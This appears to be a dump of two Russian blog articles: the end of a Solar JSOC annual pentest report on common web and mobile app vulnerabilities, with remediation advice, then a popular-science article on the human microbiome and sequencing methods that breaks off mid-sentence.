случае мы проверяли возможность получения первичного доступа во внутреннюю сеть через беспроводные сети. Например, в одном из проектов удалось успешно подключиться к беспроводной сети, которая оказалась никак не изолирована от внутренней сети. Это позволило развить дальнейший вектор атаки и получить контроль над доменом. Таким образом, использование уязвимых технологий беспроводных сетей и отсутствие корректных разграничений между сетями может позволить злоумышленнику получить доступ во внутреннюю сеть и развить вектор повышения привилегий.Дополнительно отметим, что атаки с помощью беспроводных сетей могут проводиться без физического присутствия в офисе компании, и злоумышленник может находиться на удалении от беспроводных точек доступа.Анализ защищенности веб- и мобильных приложенийАнализ защищенности веб- и мобильных приложений направлен на поиск максимального количества уязвимостей и недостатков, демонстрацию возможностей их эксплуатации, а также оценку уровня защищенности и последствий успешной эксплуатации обнаруженных уязвимостей.  В ходе каждого проекта по анализу защищенности мобильных приложений проводится проверка приложений для двух операционных систем: iOS и Android.Основные результаты работКак и в 2023 году, более половины проанализированных веб-приложений российских компаний было отмечено низким (28%) и средним (28%) уровнем защищенности. То есть по-прежнему более 50% приложений содержат уязвимости и недостатки, позволяющие нанести существенный ущерб информационным активам и репутации компании. Хотя бы одна критичная уязвимость была обнаружена в 46% исследованных приложений.С мобилками ситуация обстоит лучше: высоким уровнем защищенности было отмечено 80% приложений для смартфонов. Однако здесь важно подчеркнуть одну вещь: многие приложения, получившие такую оценку, неоднократно исследовались нами на протяжении нескольких лет. Таким образом, высокие показатели уровня защищенности во многом были достигнуты благодаря регулярному проведению анализа защищенности и своевременному устранению выявленных уязвимостей и недостатков.Кроме того, даже несмотря на положительную динамику, в мобильных приложениях по-прежнему присутствуют уязвимости и недостатки высокой и/или средней степени критичности, снижающие уровень защищенности и позволяющие нанести ущерб компании.Распространенные уязвимости и недостатки веб-приложенийВ 2024 году «ТОП-5» уязвимостей и недостатков веб-приложений получился следующий:Как видно из гистограммы, картина в целом напоминает 2023 год: все так же на первых местах раскрытие отладочной и конфигурационной информации, некорректная реализация контроля доступа и XSS’ки. Недостатки, связанные с раскрытием отладочной и конфигурационной информации, могут позволить злоумышленнику получить такие сведения, как переменные окружения, учетные данные, исходный код приложения, внутренние IP-адреса и прочие данные. Подобная информация в свою очередь позволяет упростить поиск известных уязвимостей и подготовку дальнейших атак.Например, в одном из приложений подобные недостатки позволили нам обнаружить адреса тестовых стендов разработчиков, среди которых был публично доступный репозиторий Gitlab, раскрывающий исходный код серверной части приложения. Доступ к исходному коду позволяет хакеру провести его анализ и выявить имеющиеся уязвимости, которые могут быть использованы для последующих атак. Также встречаются недостатки, раскрывающие исходный код клиентской части, доступ к которому может позволить злоумышленнику подготовить страницу, имитирующую страницу веб-приложения, и использовать ее для проведения атак на пользователей методами социальной инженерии. Более того, такие недостатки сами по себе могут позволить реализовать угрозы, приводящие к существенному ущербу для информационных активов компании. Например, одно из исследованных приложений позволяло получить доступ к документации API, раскрывающей сценарий для получения доступа к переменным окружения, в том числе к ключу шифрования JWT-токена и парольной фразе. Эти данные позволили выполнить эксплуатацию другого недостатка, связанного с возможностью обхода механизмов аутентификации. В результате удалось сформировать корректный JWT-токен для другого пользователя и получить доступ к его данным. Еще пример – в одном из проектов приложение раскрывало содержимое журналов аутентификации SAML с данными пользователей, включающими в себя ФИО, адреса электронной почты, роли и др. Также злободневной проблемой остаются недостатки контроля доступа, про которые мы не однократно писали в аналитических отчетах. Напомним, что они могут привести к получению данных пользователей, повышению привилегий, чтению и изменению обрабатываемой в приложении информации, выполнению действий, недоступных из графического интерфейса. Например, в одном из проектов эксплуатация таких недостатков позволила получить доступ к персональным данным пользователей (ФИО, номер телефона, паспортные данные, СНИЛС, адрес электронной почты).Не стоит забывать, что некорректная реализация контроля доступа может привести к повышению привилегий и получению доступа к админской функциональности. Например, в одном из исследованных нами приложений проверка роли пользователя при входе в административный интерфейс осуществлялась путем направления запроса к серверной части, однако роль в ответе от сервера могла быть заменена. В результате нам удалось заменить стандартную роль на роль администратора и повысить таким образом привилегии.Не менее опасными являются уязвимости, приводящие к возможности проведения атак «Межсайтовое внедрение сценариев (XSS)». В результате успешного проведения такой атаки могут быть реализованы следующие угрозы:Стоит отметить, что успешная реализация подобной атаки может позволить злоумышленнику отобразить для пользователей произвольные изображения, текст и прочие данные, в том числе противоправного характера. Нелегитимная информация, размещенная на официальном ресурсе организации, может вводить пользователей в заблуждение, так как она будет восприниматься как информация из официального источника. Это в свою очередь может привести к репутационному ущербу для компании и распространению заведомо ложных данных, в том числе через средства массовой информации.//когда XSS обнаружилась в нужное время в нужном местеDisclamer: на иллюстрации изображен ПРИМЕР того, к чему может привести успешная «контекстная» атака «Межсайтовое внедрение сценариев (XSS)». Все возможные совпадения на картинке случайны – такое может произойти в любое время в любом месте.Распространенные уязвимости и недостатки мобильных приложенийКак обычно, больше всего уязвимостей и недостатков было обнаружено в серверной части (72%). Это обусловлено в первую очередь тем, что эксплуатация уязвимостей клиентской части затруднительна, так как для нее зачастую требуется физический или удаленный доступ к устройству. 71% уязвимостей и недостатков серверной части был отмечен низкой сложностью эксплуатации, что говорит об отсутствии необходимости соблюдения каких-либо дополнительных условий для их успешной эксплуатации.«ТОП» уязвимостей серверной части в 2024 году получился такой:Об угрозах, которые несет в себе раскрытие отладочной и конфигурационной информации и недостатки контроля доступа, мы подробно говорили в разделе про веб-приложения, а также неоднократно писали в предыдущих аналитических отчетах и обзоре за 2023 год. На третьем месте «ТОПа» в минувшем году оказались недостатки, связанные с использованием JWT-ключа по умолчанию.  В 27% мобильных приложений для подписи JWT-токена с помощью алгоритма HS256 используется ключ по умолчанию. Такие ключи могут быть легко подобраны или получены из публичных источников, что может позволить злоумышленнику подделать токен и получить несанкционированный доступ к защищенным ресурсам. Использование предсказуемых ключей снижает уровень защищенности приложения и делает его уязвимым для дальнейших атак.Для клиентской части мобильных приложений картина следующая:Здесь все также по классике: в «ТОПе» остаются недостатки, связанные с отсутствием обфускации исходного кода, небезопасным хранением данных на устройстве и раскрытием чувствительных данных в исходном коде. Это говорит о том, что разработчики мобильных приложений из года в год допускают однотипные ошибки. Стоит отметить, что подобные недостатки могут позволить злоумышленнику получить различную чувствительную информацию и использовать ее для подготовки и проведения дальнейших атак. Например, исследованные в минувшем году приложения сохраняли на устройстве различную информацию о пользователях, включая персональные данные, такие как ФИО, СНИЛС, дата рождения и прочие сведения.//когда в очередной раз находишь одни и те же багиЗаключениеИтак, угадайте, про что мы хотим сказать в заключении? Правильно, напомнить все те же прописные истины ключевые моменты, о которых уже говорили годом ранее:1.      Лучший способ не допустить реализации угроз ИБ – это профилактика. Именно постоянное отслеживание уровня защищенности внешней и внутренней инфраструктуры, мобильных и веб-приложений и своевременное устранение выявленных уязвимостей и недостатков позволяет обезопасить свои информационные активы и не допустить возникновение инцидентов ИБ.2.     Важно не только выявить, но и устранить найденные уязвимости и недостатки. Нередки ситуации, когда при проведении ретестов мы обнаруживаем все те же баги, что и в ходе первоначальных работ. Это говорит о том, что, к сожалению, не всегда после пентеста или анализа защищенности компания проводит работы по устранению выявленных уязвимостей и недостатков. В таком случае смысл проведения пентеста просто теряется. 3.     Одной из неизменных проблем все также остается та самая «прокладка между рулем и сиденьем» - человеческий фактор. И все также «безопасные» пароли прокладывают хакеру путь к информационным активам компаний из самых разных отраслей: ИТ, производство, госсектор, финансы, медиа и др. Поэтому важными составляющими обеспечения безопасности остаются обучение сотрудников основам ИБ и введение строгой парольной политики. 4.     При анализе рисков ИБ не следует забывать о различных нетиповых ситуациях, например, возможности проникновения на территорию компании или получения доступа к внутренней сети через беспроводные сети.Авторы: Анна Коваленко, технический писатель - аналитик отдела анализа защищенности центра противодействия кибератакам Solar JSOC, ГК ""Солар""Ирина Лескина, руководитель направления аналитики отдела анализа защищенности центра противодействия кибератакам Solar JSOC, ГК ""Солар"""
95,Роль микробиома и микробиоты в нашем организме,Сбер,"Технологии, меняющие мир",0,"Программное обеспечение, Мобильные технологии, Веб-сервисы",2025-04-09,"В каждом из нас обитает бесчисленное множество микроорганизмов. То, что на первый взгляд кажется нездоровым, при ближайшем рассмотрении оказывается ценным симбиозом, особенно если говорить о бактериях, которые живут на нашей коже, в лёгких и кишечнике, выполняя жизненно важные для нас задачи. Без них люди просто-напросто не смогли бы выжить. В организме каждого из нас проживает несколько десятков триллионов бактерий, в то время как тело среднестатистического человека состоит из примерно 30 триллионов клеток. Термины микробиота и микробиом описывают разные аспекты и не являются друг другу синонимами.Все микроорганизмы, которые симбиотическим, а иногда и патологическим образом живут в организме человека, относятся к микробиоте. Её состав уникален и зависит от нашего питания, образа жизни, условий окружающей среды и т. д. Она принимает участие в процессах пищеварения, защищает от патогенов и поддерживает работу иммунитета.Совокупность генетического материала всех микроорганизмов называется микробиомом. Его изучение помогает понять, как генетическое разнообразие микробов влияет на физиологические процессы и здоровье человека.Наш микробиом начинает формироваться ещё в утробе матери. В 2020 году группа учёных обнаружила микробиом в лёгких плода и плаценте уже в первом триместре. По мере эмбрионального развития он изменяется. Исследователи предположили, что микроорганизмы и их ДНК передаются от матери к плоду для того, чтобы подготовить иммунную систему ребёнка. Они обнаружили, что лёгкие младенцев сразу после рождения уже оказались колонизированы бактериями, независимо от типа родов. В исследовании анализировали 31 образец тканей лёгких, плаценты и кишечника эмбрионов возрастом от 11 до 20 недель. Бактериальную ДНК обнаружили с помощью целевого анализа гена рибосомальной РНК 16S, стандартного метода идентификации различных микробных групп.Исследования показывают, что микробы в желудочно-кишечном тракте эмбриона живут благодаря внутриутробным источникам. При этом они неактивны и почти не размножаются из-за отсутствия пищи. Поэтому до рождения ЖКТ малыша фактически стерилен. Но после, в первые сутки «самостоятельной» жизни новорождённых, начинается активное развитие микробиома с быстрым ростом колоний кишечной палочки и энтерококков, во вторые сутки — лактобацилл, в третьи — бифидобактерий.Другим источником микроорганизмов является грудное молоко, которое вместе с окружающей средой, продуктами питания или контактом с животными существенно способствует изменению микробиоты ребёнка в первый год жизни. К третьему году микробиота уже очень похожа на таковую у взрослого человека. Некоторые исследования показали, что как естественные роды, так и грудное вскармливание имеют решающее значение для обеспечения ребёнка микробиотой, способной лучше защитить его от риска заражения болезнями и инфекциями даже во взрослом возрасте.Наша микробиота участвует в регуляции метаболизма, влияет на психологическое состояние через серотонинергическую систему и гипоталамо-гипофизарно-надпочечниковую ось, помогает контролировать воспалительные процессы и способствует развитию иммунитета.Есть три критерия оценки состояния микробиоты и, соответственно, нашего здоровья:микробное разнообразие;количественное присутствие каждого вида микроорганизмов;баланс между полезными и потенциально вредными видами.Здоровая микробиота характеризуется биоразнообразием, оптимальным количеством каждого вида и преобладанием полезных микробов, гармонично взаимодействующих друг с другом. Пока результаты исследований не дали точного представления о профиле здоровой микробиоты. Но, уже стало понятно, что снижение микробного разнообразия, особенно в кишечнике, повышает риск развития таких заболеваний, как астма, ожирение, диабет и атопический дерматит.Некоторые микроорганизмы являются комменсальными, то есть они сосуществуют с нами, не причиняя вреда и не принося пользы; другие же имеют мутуалистические отношения и необходимы для основных функций организма (например, пищеварения или иммунной системы). Большая часть находится в толстом кишечнике, в тонком кишечнике их намного меньше, а в желудке лишь немногие бактерии чувствуют себя комфортно из-за агрессивной желудочной кислоты. Остальная часть микроорганизмов живёт на поверхности кожи и на всех возможных слизистых оболочках.Рассмотрим чуть подробнее, какие микробы живут в основных нишах нашего организма, какие функции они выполняют и как влияют на наше состояние здоровья.Ротовая полость и желудочно-кишечный трактПримерное распределение микроорганизмов в ЖКТВ нашей ротовой полости живёт более 200 видов микроорганизмов, в том числе стрептококки, стафилококки, лактобациллы, коринебактерии и анаэробы. Ради собственного выживания они защищают нас от колоний патогенных бактерий, а некоторые борются и с вирусами. Основная роль отводится различным стрептококкам и представителям кишечной и кожной микробиоты. Эти микробы помогают держать в узде микробные патогены.В желудке в основном проживают кислотоустойчивые бактерии рода Lactobacillus и некоторые бифидобактерии. При нарушении защитных механизмов такие бактерии, как Helicobacter pylori, могут находить в желудке свой биотоп и вызывать инфекционные заболевания или приводить к язве.Когда вы едите, только лишь небольшое количество питательных веществ всасывается через желудок. Основное усвоение происходит в тонком кишечнике, где ферменты, вырабатываемые кишечными бактериями, расщепляют неперевариваемые углеводы. К моменту, когда пища выходит из тонкого кишечника, около 90 % питательных веществ уже усваиваются организмом.Состав кишечных бактерий сложен и индивидуален, как отпечаток пальца. В кишечнике обнаружены крупные семейства бактерий, такие как Prevotella, Ruminococcus, Bacteroides и Firmicutes. В толстой кишке, где мало кислорода, обитают анаэробные бактерии Peptostreptococcus, Bifidobacterium, Lactobacillus и Clostridium. Эти микроорганизмы предотвращают чрезмерный рост вредных бактерий, конкурируя за питательные вещества и места прикрепления к кишечным слизистым оболочкам, которые являются основным местом иммунной активности и производства антимикробных белков.Здоровая микробиота включает в себя множество различных видов, родов и штаммов бактерий. Чем больше полезных бактериальных культур в кишечнике, тем лучше, потому что каждый вид может выполняет уникальные и нужные нам функции. Наука ещё не установила точный состав здоровой микробиоты. Предполагается, что важен не столько конкретный вид бактерий, сколько уникальные особенности каждого из них, включая продукты обмена веществ (метаболиты) и их влияние на здоровье. Исследователи всё чаще сосредотачиваются на метаболических функциях бактерий, известных как метаболом.Большинство бактерий необходимы для правильной работы нашего организма. Кишечный микробиом улучшает пищеварение и стимулирует перистальтику кишечника, ферментирует клетчатку и производит витамины, включая витамины группы B (B12, тиамин (B1), рибофлавин (B2)) и витамин K, необходимый для свёртывания крови.Он также защищает нас от проникновения патогенов и регулирует иммунную систему через лимфоидную ткань, ассоциированную с кишечником (GALT). Помимо этого, он обеспечивает энергией эпителиальный слой кишечника, поддерживая его барьерные функции, и передаёт сигналы в нервную систему, влияя на её работу.Мозг и кишечник связаны сложной коммуникационной сетью, передающей электрические сигналы в обоих направлениях. Помимо прямой связи через нервную систему, мозг и кишечник взаимодействуют через кровоток, высвобождая гормоны и молекулы, вырабатываемые микробиотой кишечника (такие как короткоцепочечные жирные кислоты, нейротрансмиттеры и витамины). Эти связи позволяют мозгу контролировать функции кишечника, а кишечнику — влиять на функции мозга.Микроорганизмы в нашем ЖКТ:защищают нас от токсинов (включая фенолы и металлы), мутагенов, канцерогенов и свободных радикалов;аккумулируют и выводят токсические продукты, химические соединения и ксенобиотики;подавляют рост гнилостных бактерий, патогенов и условно-патогенной флоры, вызывающей кишечные инфекции;укрепляют иммунную систему, стимулируя синтез антибиотикоподобных веществ;синтезируют витамины и незаменимые аминокислоты;играют ключевую роль в пищеварении и обменных процессах, улучшают всасывание витамина D, железа и кальция;перерабатывают пищу, восстанавливают моторные и пищеварительные функции ЖКТ, предотвращают метеоризм и нормализуют перистальтику;влияют на психическое состояние, регулируют сон, циркадные ритмы и аппетит;обеспечивают клетки организма энергией, преобразуя питательные вещества.Влияние на заболеванияБолезни дёсен, вызванные дисбалансом микробиоты полости рта, связаны с повышенным риском сердечно-сосудистых заболеваний. В 1993 году было проведено исследование, которое показало, что у людей с пародонтитом на 25 % был повышен риск возникновения сердечно-сосудистых заболеваний по сравнению со здоровыми людьми.Исследования также обнаружили бактерии как в полости рта, так и в атеросклеротических бляшках. Проникновение бактерий в клетки атером и высвобождение воспалительных медиаторов, таких как С-реактивный белок (СРБ) и фибриноген, приводят к развитию атеросклероза.В свою очередь, микробиота кишечника, крупнейший эндокринный орган, также играет важную роль в сердечно-сосудистой системе, и дисбиоз способствует развитию заболеваний. Микробы кишечника участвуют в метаболизме веществ, таких как холин и карнитин, что приводит к образованию триметиламин-N-оксида. Он влияет на баланс холестерина и уровень желчных кислот, и связан с ранним атеросклерозом и высоким риском смертности от сердечно-сосудистых заболеваний. Он активирует сигнальные пути, способствующие воспалению и повреждению сосудов. Липополисахарид — компонент некоторых бактерий, — вызывает стресс и воспаление в сосудах, что ведёт к их дисфункции.Микробиота кишечника также метаболизирует полисахариды и белки в короткоцепочечные жирные кислоты. Они защищают от повреждений, связанных с гипертонией, при помощи регуляции иммунных клеток и снижения тахикардии, а также регулируют артериальное давление, влияя на рецепторы в клетках сосудов.КожаИсточник. Кожные липиды поддерживают эпидермальный барьер и влияют на взаимодействие человека и микробов. Эпидермис состоит из слоёв кератиноцитов, которые поддерживают целостность кожи. Липиды наблюдаются в дифференцирующихся слоях эпидермиса и выделяются сальными железами. Основные липиды рогового слоя влияют на колонизацию микробами, такими как Staphylococcus aureus. Микробиота кожи вырабатывает метаболиты, поддерживающие гомеостаз барьера. При патологических состояниях эти взаимодействия могут ухудшать состояние кожи, вызывая воспаление.На нашей коже проживает не меньшее количество микроорганизмов, чем в кишечнике. Кожный барьер состоит из микробных, иммунных, химических и физических элементов. Сальные железы вырабатывают жиры для защиты от обезвоживания, а потовые железы выделяют антимикробные пептиды, которые ограничивают рост патогенных микроорганизмов. На ней обнаруживаются преимущественно грамположительные (Staphylococcus spp., Corynebacterium spp., Enhydrobacter spp., Micrococcus spp., Cutibacterium spp. и Veillonella spp.) и грамотрицательные бактерии (Roseomonas mucosa, Pseudomonas spp., Acinetobacter spp., Pantoea septica и Moraxella osloensis). Также там живут археи (таумархеоты и эвриархеоты), которые могут влиять на регуляцию pH кожи и естественный защитный барьер организма.В вирусной фракции кожи преобладают бактериофаги, участвуя в гомеостазе кожной микробиоты. Наиболее распространены фаги Cutibacterium и Staphylococcus, в меньших количествах встречаются фаги Streptococcus и Corynebacterium. Также идентифицированы вирусы, такие как Acheta domestica Densovirus, альфапапилломавирус, вирусы папилломы человека (β, γ, μ), полиомавирус клеток Меркеля, вирус контагиозного моллюска, полиомавирусы HPyV7 и HpyV6, ретровирус RD114 и вирус обезьян. Как комменсальные организмы человеческой кожи идентифицированы грибы, включая Malassezia, Cryptococcus, Rhodotorula и Candida. Состав грибкового сообщества на коже ранее считался схожим по всем участкам тела, но недавние исследования показали, что Malassezia spp. преобладают на центральных участках тела и руках, тогда как участки стоп колонизированы более разнообразной комбинацией грибов. Клещи семейства Demodicidae, известные как Demodex, обитают в себорейных зонах кожи, таких как лицо и волосы, а также широко распространены на веках и крыльях носа.Сама по себе микробиота выполняет барьерную функцию от инвазии, колонизации и заражения патогенами. Резидентные микроорганизмы на коже для своего выживания фактически разработали собственные стратегии противодействия своим соперникам. Например, Staphylococcus hominis производит антибактериальные вещества, эффективные против Staphylococcus aureus. Staphylococcus capitis использует регуляторный ген для активации кворум-сенсинга в борьбе с Staphylococcus aureus. Эти механизмы взаимодействуют с иммунным ответом человека. Например, антибактериальные пептиды, продуцируемые Staphylococcus lugdunensis, стимулируют кератиноциты к продукции антимикробных пептидов LL-37 и CXCL8, оказывающих хемотаксическое действие на клетки врождённого иммунного ответа.Микробиом кожи способствует её барьерной функции и поддерживает гомеостаз. Ферменты протеазы, секретируемые микробами, участвуют в шелушении и обновлении рогового слоя. Кожное сало и свободные жирные кислоты регулируют pH. Липазы разрушают липидную плёнку на поверхности кожи, а уреазы деградируют мочевину. Микробиота также участвует в образовании биоплёнок, производстве бактериоцинов и кворум-сенсинге. Кроме того, микробиота кожи защищает от патогенов, конкурируя и продуцируя антимикробные пептиды (АМП).Влияние на заболеванияКожа и её микробиом остаются взаимосвязанными на протяжении всей жизни. Учёные особенно интересуются ролью микробиома кожи в развитии дерматологических заболеваний. Множество исследований показывают, что дисбиоз ассоциирован с такими заболеваниями, как атопический дерматит (нейродермит) и акне.При нейродермите во время обострения общее бактериальное разнообразие на коже резко снижается и доминирует золотистый стафилококк, который ослабляет барьерную функцию кожи и усиливает воспалительный процесс.При акне наблюдается повышенное количество бактерий Cutibacterium acnes и клеток воспаления. В период полового созревания повышенное производство кожного сала создаёт благоприятную среду для C. acnes.Тесную связь между здоровьем дермы и разнообразием или количеством бактерий можно наблюдать и при других заболеваниях, таких как псориаз. Дисбиоз приводит к тому, что безобидные микроорганизмы превращаются в патогенные.Дисбаланс кожной микробиоты может быть вызван такими внешними факторами, как воздействие ультрафиолета, частое использование моющих и дезинфицирующих средств, а также косметики. Что касается внутренних факторов и образа жизни, то можно выделить такие: возраст; генетика; ослабленный иммунитет; изменение гормонального баланса; недостаток сна;метаболические нарушения; диета, богатая сахарами и жирами; нездоровый образ жизни (стресс, употребление никотина, алкоголя и наркотических средств); чрезмерное применение антибиотиков.Микробиота влияет на процессы старения кожи, включая иммунные функции, устойчивость к УФ-излучению и метаболизм. С возрастом изменения в микробиоте кожи могут способствовать колонизации различных микроорганизмов, в том числе патогенными. Такие изменения приводят к морщинам и повышенной восприимчивости к инфекциям. У пожилых людей уменьшается уровень Cutibacterium и специфических групп Firmicutes. Также функциональность микробиоты изменяется: если стрептококки в микробиоте детей положительно влияют на состояние кожи, то пожилым людям они могут навредить.Дыхательные путиВерхние дыхательные пути содержат плотные микробные сообщества, которые предотвращают распространение патогенов в нижние дыхательные пути. Микробиота носа отличается от микробиоты верхних дыхательных путей и остаётся постоянной на протяжении всей жизни, но может изменяться в среднем возрасте. В 40-65 лет доминируют Species Staphylococcus, Streptococcus, Veillonella, Cutibacterium и Corynebacterium, а также Lactobacillus reuteri, Staphylococcus epidermidis и Rothia mucilaginosa у пожилых людей.У людей старше 65 лет, страдающих инфекциями дыхательных путей, чаще встречаются Corynebacterium, Moraxella, Staphylococcus, Dolosigranulum, Streptococcus и другие бактерии. В ротоглотке — Prevotella, Veillonella, Streptococcus и другие. Moraxella catarrhalis и M. nonliquefaciens менее распространены у пожилых людей с инфекциями нижних дыхательных путей, но эти бактерии могут вызывать инфекции у детей.Некоторые микроорганизмы играют важную роль в связи между носовой полостью и центральной нервной системой (ЦНС). Chlamydia pneumonia может быть связана с болезнью Паркинсона, а дифтерийный токсин Corynebacterium diphtheriae может вызывать болезнь Паркинсона.Лёгкие же формируют самую обширную поверхность органа в контакте с внешней средой и ежедневно взаимодействуют с примерно 7000 литров воздуха, содержащего микробы. Большое количество микробов обитает в ротоглотке, которая анатомически связана с лёгкими, и даже в здоровом состоянии люди подвергаются субклинической аспирации содержимого ротоглотки.До 2010 года считалось, что лёгкие являются стерильным органом. Но в 2010 году было проведено первое исследование, которое подтвердило наличие микробиоты лёгких и развенчало догму об их стерильности. Теперь известно, что микробиота лёгких может быть культивирована из образцов, взятых у человека, метаболически активна и изменяется в зависимости от состояния здоровья. Более того, доклинические исследования лёгочных заболеваний подтверждают потенциальную причинную роль микробиоты, а некоторые работы указывают на её участие в патогенезе внелёгочных заболеваний.Влияние на заболеванияВ норме микробиом лёгких состоит из ротоглоточных таксонов (Prevotella, Veillonella и Streptococcus), как подтверждают исследования с использованием секвенирования гена 16S рРНК. Лёгкие работают над поддержанием низкой микробной биомассы для обеспечения эффективного газообмена. Увеличение бактерий в дыхательных путях приводит к нарушению иммунного регулирования, прогрессирующему повреждению и воспалению. Удаление бактерий из дыхательных путей происходит через кашель, мукоцилиарный клиренс и защитные механизмы нашего организма в целом.Независимые исследования показывают, что дисбактериоз микробиоты лёгких может способствовать неблагоприятным эффектам от вдыхаемых химических веществ. Дисбиоз легких может быть спровоцирован влиянием факторов окружающей среды и связан с такими заболеваниями, как астма, рак лёгких, идиопатический лёгочный фиброз (ИЛФ), хроническая обструктивная болезнь лёгких (ХОБЛ) и муковисцидоз. Влияние химически вызванного дисбактериоза подтверждено в отношении загрязнителей воздуха, сигаретного дыма и ингаляционных химических веществ.Микробиота лёгких взаимодействует с центральной нервной системой через ось лёгкие-мозг и может способствовать респираторным заболеваниям через дисбактериоз кишечной микробиоты в рамках оси кишечник-лёгкие.Иммунная системаИсточник. Микробиота состоит из бактерий, грибков, архей, вирусов и клещей (Demodex), взаимодействующих с иммунной системой через диалог с резидентными дендритными клетками и активацию комплемента (а). Иммунная система укрепляется благодаря процессу кворум-сенсинга между бактериальными популяциями, который может контролировать избыточный рост потенциальных патогенов, а также благодаря синтезу специфических антибиотиков, таких как лугдунин (с). Гомеостаз микробиоты поддерживается производством антимикробных пептидов как бактериями, так и клетками-хозяевами, такими как кератиноциты и себоциты (b и d).Исследователи из медицинского комплекса Шарите и исследовательского центра ревматизма в Берлине выявили важность микробиома для иммунной защиты. Их исследования, опубликованные в журнале Cell, показали, что микробиом является необходимым триггером иммунного ответа в дендритных клетках (cDC). Дендритные клетки распознают и представляют патогены Т-клеткам, играя ключевую роль в активации иммунной реакции. Без микробиома дендритные клетки не могут инициировать иммунные реакции, так как им не хватает «топлива» для реагирования на патогены.В частности, в нашем кишечнике сосредоточено более 70 % иммунных клеток, которые защищают от проникновения бактерий в кровеносное русло и устраняют патогены. Эти функции обеспечиваются врождённым иммунитетом (наследуемым от матери) и приобретённым (образующимся после контакта с чужеродными белками).Столкновение с патогенами стимулирует иммунную защиту через Toll-подобные рецепторы, запускающие синтез цитокинов. Микроорганизмы кишечника воздействуют на лимфоидную ткань, усиливая клеточный и гуморальный иммунные ответы. В итоге, клетки кишечника активно вырабатывают секреторный иммуноглобулин А (S-IgA) — ключевой белок местного иммунитета.Как изучают микробиомТехнологии и методы исследования микробиома включают в себя целый спектр молекулярно-генетических и биохимических подходов.Секвенирование ДНКСеквенирование помогает определить, какие микробы присутствуют и как они взаимодействуют друг с другом.Секвенирование 16S рРНКГен 16S рРНК содержит консервативные и гипервариабельные области, которые позволяют амплифицировать и различать микробные виды. Процесс секвенирования включает в себя сбор образцов из биологических субстратов, выделение из них ДНК, амплификацию гена 16S рРНК, секвенирование и биоинформатический анализ для идентификации видов и их относительной численности. Этот метод применяют в исследованиях здоровья, заболеваний, экологических исследований и разработки пробиотиков и пребиотиков.Полногеномное секвенирование (WGS)Это секвенирование генома всех микроорганизмов в образце, чтобы наиболее детально описать микробное сообщество. В отличие от секвенирования 16S рРНК, WGS позволяет анализировать мелкие вариации в геномах разных микроорганизмов, включая выявление неизвестных и некультивируемых видов. Этот метод практически исключает перекосы, обеспечивая точное определение относительной численности микроорганизмов. WGS широко используют для изучения микробиома при заболеваниях, мониторинге здоровья, а также в фармацевтических и биотехнологических исследовательских проектах. Он играет ключевую роль в понимании сложных взаимоотношений между микробами и их хозяином.Секвенирование по СэнгеруИсторически один из первых методов секвенирования ДНК, который применяют в микробиологических исследованиях для более точного анализа отдельных микроорганизмов. Процесс начинают с экстрагирования и очищения ДНК из микробного сообщества. Затем при помощи полимеразной цепной реакции (ПЦР) амплифицируют целевой участок ДНК. В процессе секвенирования применяют меченные флуоресцентными красителями дидезоксинуклеотиды (ddNTPs), создавая фрагменты ДНК различной длины. Эти фрагменты затем разделяют по длине при помощи капиллярного электрофореза. Лазер считывает флуоресцентные маркеры, а детектор фиксирует сигналы, создавая хроматограммы, представляющие последовательность ДНК. Высокая точность метода позволяет достоверно определить последовательность нуклеотидов вплоть до одного основания, что делает его идеальным для подтверждения анализа точечных мутаций. На сегодняшний день этот метод устаревает из-за очень высоких затрат денег и времени; к тому же размер метагенома превосходит размер человеческого генома.Высокопроизводительное секвенирование (HT-NGS)Позволяет секвенировать миллионы фрагментов ДНК одновременно, обеспечивая высокую пропускную способность и детальность анализа. Процесс начинают с экстрагирования ДНК из микробного сообщества, затем ДНК разрезают на короткие фрагменты. Их одновременно амплифицируют и секвенируют, получая большие объёмы данных. HT-NGS обеспечивает полный обзор микробных сообществ в образце, независимо от их жизнеспособности и культуры. Методология охватывает как бактериальные, так и вирусные геномы.Нанопоровое секвенированиеПрименяют для глубокого анализа микробиома. Чтение длинных последовательностей ДНК или РНК в реальном времени позволяет определить полные геномы микроорганизмов без их фрагментации. Процесс начинают с извлечения высокомолекулярной ДНК из микробного сообщества. Затем с помощью специальных белков образцы ДНК направляют через мембрану с нанопорами. По мере прохождения считывают изменение ионного тока, которое зависит от последовательности нуклеотидов. Этот сигнал преобразуют в последовательность ДНК в реальном времени. Нанопоровое секвенирование применяют для анализа сложных микробных сообществ, обнаружения известных и новых видов микроорганизмов, уточнения состава и функциональных возможностей микробиома, для исследования смешанных инфекций и мониторинга антибактериальной резистентности.Пиросеквенирование и секвенирование лигированиемЭти методы основаны на принципах синтеза ДНК и используются для изучения микробиома в различных контекстах. В процессе пиросеквенирования при добавлении каждого нуклеотида возникает микровспышка света, которую регистрируют специальной камерой. Так определяют последовательность ДНК в реальном времени. В секвенировании лигированием (SOLiD, Sequencing by Oligonucleotide Ligation and Detection) используют ферменты лигазы для связывания коротких олигонуклеотидов с целевой ДНК. Это обеспечивает высокую точность и позволяет детально анализировать микробиом.МетаболомикаЭто изучение химических процессов, связанных с метаболитами, которые представляют собой малые молекулы, участвующие в метаболизме. Метаболомика помогает понять, как микроорганизмы влияют на метаболические процессы, и как изменения микробиома отражаются на здоровье человека и развитии заболеваний.Анализ начинают со сбора и подготовки биологических образцов (кровь, моча, экскременты или слюна). Затем при помощи масс-спектрометрии или ядерно-магнитного резонанса определяют и количественно оценивают метаболиты. Получают подробный профиль метаболического состояния организма, и появляется возможность идентифицировать биомаркеры воспалительных заболеваний кишечника, диабета, а также сердечно-сосудистых заболеваний.Флуоресцентная микроскопияЭтот метод позволяет визуализировать микробные сообщества в биологических образцах с использованием флуоресцентных красителей или белков, которые светятся при определённой длине волны.Начинается всё с подготовки биологического образца, который может быть взят, например, из кишечника, ротовой полости или кожи. Образец обрабатывают для фиксации клеток и предотвращения их разрушения. Затем применяются флуоресцентные красители или белки, которые связываются с целевыми компонентами микробного сообщества, такими как ДНК, РНК или стенки клеток микробов. После этого образец помещают под флуоресцентный микроскоп. При освещении ультрафиолетовым или видимым светом флуоресцентные метки испускают свет с различной длиной волны. Его улавливают детектором или камерой, и это позволяет получить визуальные изображения локализации и распределения микроорганизмов. С помощью специализированного программного обеспечения анализируют полученные изображения, обнаруживают детали структуры, оценивают количество и взаимодействие микробов.ПЦР (полимеразная цепная реакция)Этот метод позволяет амплифицировать специфические участки ДНК для количественного определения и анализа микробов в биологических образцах. Он позволяет выделить даже малые концентрации микроорганизмов и исследовать генетические особенности микробного сообщества.Процесс начинают с извлечения ДНК из биологического образца, такого как фекалии или мазок со слизистой. Затем в тестовую смесь добавляют 